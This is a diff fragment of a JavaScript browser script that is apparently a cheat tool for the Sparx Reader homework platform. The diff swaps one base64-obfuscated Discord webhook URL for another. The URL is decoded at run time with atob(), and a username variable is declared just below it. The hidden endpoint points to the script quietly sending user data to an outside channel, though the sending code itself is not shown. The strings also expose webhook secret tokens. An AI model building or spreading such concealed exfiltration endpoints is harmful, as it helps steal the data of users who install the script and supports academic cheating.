@@ -2,7 +2,7 @@ console.log("Sparx Reader Script loaded!");
 
 // === CONFIGURATION ===
 const targetText = "SparxCheat";
-const webhookBase = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM4NTAyMTkyMzYyMDAyODQ2Ni9rMGxyclpYS2JYOTF3dlBlTFlqUUZoeEd2cWZOM3pzTnFwdHk4NFR6U3FHaTJoRjRvLWxwWEhSUDI4OVZ3VmVWRUprVg=="
+const webhookBase = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQyMjk2MzcxMTQ0MTg5OTU4MS9qaF9sa0F5MW5ka3VSUTJmZmJjNXFDU3E5R3VjdkR2dTRIV2xVU3dCMUdaTWJSRFA4dEZtRzJQbTBQMnNTMmswZGw3cA=="
 const webhookURL = atob(webhookBase);
 let username = null;
 
